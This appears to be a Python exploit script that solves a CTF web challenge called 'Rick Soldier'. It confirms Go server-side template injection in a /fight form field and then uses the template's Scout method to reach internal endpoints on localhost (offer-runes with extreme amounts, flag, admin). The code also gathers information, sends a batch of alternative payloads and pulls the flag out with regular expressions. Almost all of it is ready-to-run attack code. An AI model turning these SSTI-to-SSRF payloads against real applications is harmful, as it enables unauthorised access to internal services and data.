import requests
import sys
import time
from colorama import Fore, Style, init
import argparse

# Initialize colorama for colored output
init(autoreset=True)

class RickSSTIExploit:
    def __init__(self, target_url, credentials=None):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.credentials = credentials or {
            'battle_cry': 'Morty_Is_The_Real_One',
            'secret': 'Morty_Is_The_Real_One'
        }
        
    def print_banner(self):
        """Print exploit banner"""
        banner = f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════════════╗
║        The Soldier of God, Rick - SSTI Exploit Script       ║
║                      Go Template Injection                   ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def print_status(self, message, status="info"):
        """Print colored status messages"""
        if status == "success":
            print(f"{Fore.GREEN}[+] {message}{Style.RESET_ALL}")
        elif status == "error":
            print(f"{Fore.RED}[-] {message}{Style.RESET_ALL}")
        elif status == "info":
            print(f"{Fore.CYAN}[*] {message}{Style.RESET_ALL}")
        elif status == "warning":
            print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")
        else:
            print(f"[?] {message}")
    
    def test_basic_ssti(self):
        """Test for basic SSTI vulnerability"""
        self.print_status("Testing for basic SSTI vulnerability...", "info")
        
        payloads = [
            ("{{7*7}}", "49", "Math operation"),
            ("{{.Rick.HP}}", None, "Rick HP access"),
            ("{{.Rick}}", None, "Rick object access"),
        ]
        
        for payload, expected, description in payloads:
            self.print_status(f"Testing: {description} - Payload: {payload}", "info")
            
            data = {
                'battle_cry': payload,
                'secret': self.credentials['secret']
            }
            
            try:
                response = self.session.post(
                    f"{self.target_url}/fight",
                    data=data,
                    timeout=10
                )
                
                # Check if SSTI is working
                if expected and expected in response.text:
                    self.print_status(f"SSTI CONFIRMED! {description} executed successfully!", "success")
                    return True
                elif expected is None and payload not in response.text:
                    # If payload is not reflected as-is, it might be executing
                    self.print_status(f"Potential SSTI: {description}", "warning")
                    print(f"Response snippet: {response.text[:200]}")
                
            except requests.RequestException as e:
                self.print_status(f"Request failed: {e}", "error")
        
        return False
    
    def exploit_internal_api(self, amount="999999999999999999"):
        """Exploit internal API using Scout method"""
        self.print_status("Attempting to exploit internal API...", "info")
        
        payload = f'{{{{.Rick.Scout "http://127.0.0.1:8080/internal/offer-runes?amount={amount}"}}}}'
        
        data = {
            'battle_cry': payload,
            'secret': self.credentials['secret']
        }
        
        try:
            response = self.session.post(
                f"{self.target_url}/fight",
                data=data,
                timeout=10
            )
            
            self.print_status(f"Payload sent: {payload}", "info")
            self.print_status("Response received!", "success")
            
            # Print full response
            print(f"\n{Fore.GREEN}{'='*60}")
            print("RESPONSE:")
            print('='*60)
            print(response.text)
            print('='*60 + Style.RESET_ALL)
            
            # Try to extract flag
            self.extract_flag(response.text)
            
            return response.text
            
        except requests.RequestException as e:
            self.print_status(f"Exploitation failed: {e}", "error")
            return None
    
    def extract_flag(self, response_text):
        """Try to extract flag from response"""
        import re
        
        # Common CTF flag patterns
        flag_patterns = [
            r'1pcCTF\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'\{[a-f0-9]{32,}\}',  # MD5-like
        ]
        
        for pattern in flag_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                self.print_status(f"FLAG FOUND: {matches[0]}", "success")
                print(f"\n{Fore.GREEN}{'='*60}")
                print(f"🚩 FLAG: {matches[0]}")
                print('='*60 + Style.RESET_ALL + "\n")
                return matches[0]
        
        self.print_status("No flag pattern found in response", "warning")
        return None
    
    def try_multiple_payloads(self):
        """Try multiple SSTI payloads"""
        self.print_status("Trying multiple exploitation payloads...", "info")
        
        payloads = [
            # Different amounts
            ('{{.Rick.Scout "http://127.0.0.1:8080/internal/offer-runes?amount=999999999999999999"}}', 
             "Huge amount"),
            ('{{.Rick.Scout "http://127.0.0.1:8080/internal/offer-runes?amount=1000000000"}}', 
             "1 billion"),
            ('{{.Rick.Scout "http://127.0.0.1:8080/internal/offer-runes?amount=-1"}}', 
             "Negative amount"),
            ('{{.Rick.Scout "http://127.0.0.1:8080/internal/offer-runes"}}', 
             "No amount parameter"),
            
            # Different endpoints
            ('{{.Rick.Scout "http://127.0.0.1:8080/internal/flag"}}', 
             "Flag endpoint"),
            ('{{.Rick.Scout "http://127.0.0.1:8080/flag"}}', 
             "Flag endpoint (root)"),
            ('{{.Rick.Scout "http://127.0.0.1:8080/internal/admin"}}', 
             "Admin endpoint"),
            
            # localhost instead of 127.0.0.1
            ('{{.Rick.Scout "http://localhost:8080/internal/offer-runes?amount=999999999999999999"}}', 
             "Localhost variant"),
            
            # Combined with HP check
            ('{{.Rick.HP}} {{.Rick.Scout "http://127.0.0.1:8080/internal/offer-runes?amount=999999999999999999"}}', 
             "HP + Scout combo"),
        ]
        
        results = []
        
        for payload, description in payloads:
            self.print_status(f"\nTrying: {description}", "info")
            print(f"Payload: {payload}")
            
            data = {
                'battle_cry': payload,
                'secret': self.credentials['secret']
            }
            
            try:
                response = self.session.post(
                    f"{self.target_url}/fight",
                    data=data,
                    timeout=10
                )
                
                print(f"Status: {response.status_code}")
                
                # Check for interesting content
                if "flag" in response.text.lower() or "1pc" in response.text.lower():
                    self.print_status("Interesting response detected!", "success")
                    print(f"Response: {response.text[:500]}")
                    results.append({
                        'payload': payload,
                        'description': description,
                        'response': response.text
                    })
                
                # Always try to extract flag
                flag = self.extract_flag(response.text)
                if flag:
                    return flag
                
                time.sleep(0.5)  # Be nice to the server
                
            except requests.RequestException as e:
                self.print_status(f"Request failed: {e}", "error")
        
        return results
    
    def info_gathering(self):
        """Gather information using SSTI"""
        self.print_status("Gathering information via SSTI...", "info")
        
        info_payloads = [
            ('{{.Rick.HP}}', "Rick's HP"),
            ('{{.Rick.IsDead}}', "Rick's status"),
            ('{{.Secret}}', "Secret phrase"),
            ('{{.LastMsg}}', "Last message"),
            ('{{printf "%v" .Rick}}', "Rick object details"),
        ]
        
        info = {}
        
        for payload, description in info_payloads:
            data = {
                'battle_cry': payload,
                'secret': self.credentials['secret']
            }
            
            try:
                response = self.session.post(
                    f"{self.target_url}/fight",
                    data=data,
                    timeout=10
                )
                
                # Extract the value from response
                # This is simplified - adjust based on actual response format
                info[description] = response.text[:200]
                print(f"{description}: {response.text[:100]}")
                
            except requests.RequestException as e:
                self.print_status(f"Failed to get {description}: {e}", "error")
        
        return info
    
    def run_full_exploit(self):
        """Run full exploitation chain"""
        self.print_banner()
        
        # Step 1: Test for SSTI
        self.print_status("Step 1: Testing for SSTI vulnerability", "info")
        if not self.test_basic_ssti():
            self.print_status("SSTI not confirmed, but continuing...", "warning")
        
        print()
        
        # Step 2: Information gathering
        self.print_status("Step 2: Information Gathering", "info")
        self.info_gathering()
        
        print()
        
        # Step 3: Main exploitation
        self.print_status("Step 3: Exploiting Internal API", "info")
        result = self.exploit_internal_api()
        
        print()
        
        # Step 4: Try alternative payloads if main one failed
        if not result or "flag" not in result.lower():
            self.print_status("Step 4: Trying Alternative Payloads", "info")
            self.try_multiple_payloads()


def main():
    parser = argparse.ArgumentParser(
        description='SSTI Exploitation Script for Rick Soldier CTF Challenge'
    )
    parser.add_argument(
        'target',
        help='Target URL (e.g., http://challenges.1pc.tf:23216)'
    )
    parser.add_argument(
        '--battle-cry',
        default='Morty_Is_The_Real_One',
        help='Battle cry credential (default: Morty_Is_The_Real_One)'
    )
    parser.add_argument(
        '--secret',
        default='Morty_Is_The_Real_One',
        help='Secret credential (default: Morty_Is_The_Real_One)'
    )
    parser.add_argument(
        '--quick',
        action='store_true',
        help='Skip testing and go straight to exploitation'
    )
    parser.add_argument(
        '--payload',
        help='Use custom payload instead of default'
    )
    parser.add_argument(
        '--amount',
        default='999999999999999999',
        help='Amount parameter for offer-runes endpoint'
    )
    
    args = parser.parse_args()
    
    credentials = {
        'battle_cry': args.battle_cry,
        'secret': args.secret
    }
    
    exploit = RickSSTIExploit(args.target, credentials)
    
    if args.quick:
        exploit.print_banner()
        if args.payload:
            # Use custom payload
            data = {
                'battle_cry': args.payload,
                'secret': credentials['secret']
            }
            try:
                response = exploit.session.post(
                    f"{args.target}/fight",
                    data=data,
                    timeout=10
                )
                print(response.text)
                exploit.extract_flag(response.text)
            except Exception as e:
                exploit.print_status(f"Error: {e}", "error")
        else:
            exploit.exploit_internal_api(args.amount)
    else:
        exploit.run_full_exploit()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Exploitation interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)
